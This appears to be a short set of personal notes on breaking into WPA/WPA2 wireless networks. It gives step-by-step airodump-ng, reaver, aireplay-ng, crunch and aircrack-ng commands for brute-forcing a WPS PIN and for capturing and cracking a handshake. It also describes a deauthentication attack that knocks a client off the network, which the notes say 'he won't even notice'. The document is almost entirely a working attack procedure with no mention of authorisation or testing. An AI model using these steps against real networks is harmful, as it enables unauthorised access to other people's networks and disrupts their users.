# Gaining access WPA/WPA2

## Gaining access if WPS is enabled and misconfigured

this method is used if the network is configured with WPS to use pin instead of PBA (Push Button Authentication)

- list all network using WPS
```
$ wash --interface <wireless-adapter>
```

- Before starting the attack is better to run airodump-ng to listen to the target network, this ensure that the wireless adapter is set to the same channel as the target.
```
$ airodump-ng --bssid <target-bssid> --channel <target-channel> <wireless-adapter>
```

- start bruteforce the pin once the assosiation in the next command is enstablished
```
$ reaver --bssid <target-bssid> --channel <target-channel> --interface <wireless-adapter> -vvv --no-associate
```
-vvv: outputs more usefull information;<br>
--no-associate: because we do it manually after, reaver can do it automatically but it has more chance to fail.

- assosiate with the target network
```
$ aireplay-ng --fakeauth 30 -a <target-bssid> -h <wireless-adapter-mac-addr> <wireless-adapter>
```
the option 30 tels to assosiate every 30 seconds.<br>
(Make sure the previous command reaver is running)

## Gaining access if WPS is not enabled or configured to use PBA

- listen to terget network and store data to file
```
$ airodump-ng --bssid <target-bssid> --channel <target-channel> --write <filename> <wireless-adapter>
```

- wait a new client to connect to capture the headshake package
to avoid waiting we can execute an deauthentication attack to force a client to reconnect:
```
$ aireplay-ng --deauth 4 -a <target-bssid> -c <client-mac-addr> <wireless-adapter>
```
option 4 because we disconnect the client for a very short time, he won't even notice.

- once the heandshake is capture we can quit airodump-ng

- generate a wordlist
```
$ crunch <min> <max> <character> -t <pattern> -o <filename>
```

- test all words in the wordlist to find the valid password
```
$ aircrack-ng <filename.cap> -w <wordlist-filename>
```
